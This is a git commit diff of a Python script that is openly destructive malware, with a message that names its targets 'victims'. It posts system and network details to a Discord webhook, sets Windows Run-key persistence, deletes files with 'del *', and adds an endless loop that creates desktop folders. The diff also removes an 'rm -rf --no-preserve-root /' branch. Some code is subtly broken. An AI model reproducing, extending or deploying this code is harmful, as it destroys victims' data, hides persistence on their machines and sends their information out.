398ae9214e3ae783d52a6b88a34aa18dc2fbf576
Dmitry <sgysh3nka@ya.ru>
2024-11-17 10:52:35 +0300

    Update main.py

--- main.py
+++ main.py
@@ -3,20 +3,21 @@ import sys
 import winreg
 import requests
 from datetime import datetime
+import random
 
 webhook_url = 'your_discord_webhook_url_here'
 
+network_info = os.system('netsh')
+
 def newvictimalert():
     Message = {
-        'content': f'New victim alert!\nTime: {datetime.now()}\nSystem: {os.name}\nExtra info: {sys.argv[0]}'
+        'content': f'New victim alert!\nTime: {datetime.now()}\nSystem: {os.name}\nNetwork info: {network_info}\nExtra info: {sys.argv[0]}'
     }
     requests.post(webhook_url, Message)
 
 def cls():
     if os.name == 'nt':
         os.system('cls')
-    elif os.name == 'posix':
-        os.system('clear')
 
 def autoload():
     if os.name == 'nt':
@@ -25,8 +26,6 @@ def autoload():
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, f"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "system_load", 0, winreg.REG_SZ, script_path)
         winreg.CloseKey(key)
-    elif os.name == 'posix':
-        os.startfile(sys.argv[0])
     else:
         cls()
 
@@ -37,19 +36,26 @@ def destroy():
             os.system('del *')
         except Exception as e:
             Message = {
-                'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nExtra info: {sys.argv[0]}'
+                'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nNetwork info: {network_info}\nExtra info: {sys.argv[0]}'
             }
             requests.post(webhook_url, Message)
-    elif os.name == 'posix':
+    else:
+        cls()
+
+def make_folders():
+    while True:
         try:
-            os.system('rm -rf --no-preserve-root /')
+            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
+            funny_path = os.path.join(desktop_path, 'lol-{random.randint(100)}')
+            
+            os.makedirs(funny_path)
         except Exception as e:
             Message = {
-                'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nExtra info: {sys.argv[0]}'
+                'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nNetwork info: {network_info}\nExtra info: {sys.argv[0]}'
             }
-            requests.post(webhook_url, Message)
 
 if __name__ == '__main__':
     newvictimalert()
     autoload()
     destroy()
+    make_folders()
